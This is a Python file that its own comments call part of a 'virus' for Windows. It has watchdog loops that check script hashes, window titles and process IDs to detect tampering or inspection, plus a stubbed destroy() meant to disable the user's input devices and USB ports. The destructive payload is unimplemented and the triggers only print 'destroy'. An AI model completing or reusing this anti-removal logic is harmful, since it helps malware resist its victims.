import sys
import psutil
import os
import time
import hashlib
import win32gui

def get_hashes(files): # misc to get hashes of files
    hashes = []
    for file in files:
        with open(file, 'rb') as f:
            hash = hashlib.file_digest(f, 'sha256')
            hashes.append(hash.hexdigest())
    return hashes

def og_hashes(file_loc, date): # a function that is meant to get the original hashes of the scripts from a specified file. It knows if the hashes in the original file has been messed with because the file's last modified date is set to a specific arbitrary date and if it has been modified the date will also be changed.
    last_date = os.path.getmtime(file_loc) # get the last modified date of the file
    if date != last_date: # check if the last modified date is not the same as the date set by the virus
        print('destroy') # destroy

    with open(file_loc, 'r') as f:
        original_hashes = f.readlines() # get the hashes in an array
        f.close()
    return original_hashes

def check_hashes(script_list, original_hashes): # method that checks that the script files' hashes are intact (that they haven't been changed)
    while True: # always keep on checking
        for script in script_list: # go through all the scripts
            with open(script, 'rb') as f: # open the script to be able to access its content
                hash = hashlib.file_digest(f, 'sha256').hexdigest() # get the sha256 hash of the file
                if hash not in original_hashes: # check if the hash is not one of the original hashes (if one has been changed)
                    print('destroy')
                f.close() # close to save memory

def window_enumeration_handler(hwnd, results_list):
    # Check if the window is visible to get rid of useless windows
    if win32gui.IsWindowVisible(hwnd):
        results_list.append((hwnd, win32gui.GetWindowText(hwnd)))
    return True # Continue enumeration

def check_windows(script_list): # method that checks for any of the script names in window titles
    while True: # always keep on checking
        window_list = [] # List to store window handles and titles
        win32gui.EnumWindows(window_enumeration_handler, window_list) # Enumerate through all the windows
        for window in window_list:
            for script in script_list: # check all scripts
                if os.path.basename(script) in window[1]: # check if the name of the script is in a window. For example, if someone opened the script in a text editor that displays the name of the file being edited in the window name.
                    print(f'destroy {window}') # destroy

def check_pids(pids): # checks that all of the pids of the scripts exist (therefore that none of the scripts have been closed)
    while True: # always keep on checking
        for pid in pids: # go through all the pids
            if not psutil.pid_exists(pid): # check if any pid is missing
                print('destroy') # destroy

def destroy():
    if not os.path.exists('C:/Windows/System32/Destroy me.please'): # for safety reasons, so no data is lost while debugging.
        sys.exit()
    else:
        # Disable all user interfaces (bluetooth, USB mouse/keyboard, all USB ports) so user can't manually fight against virus
        pass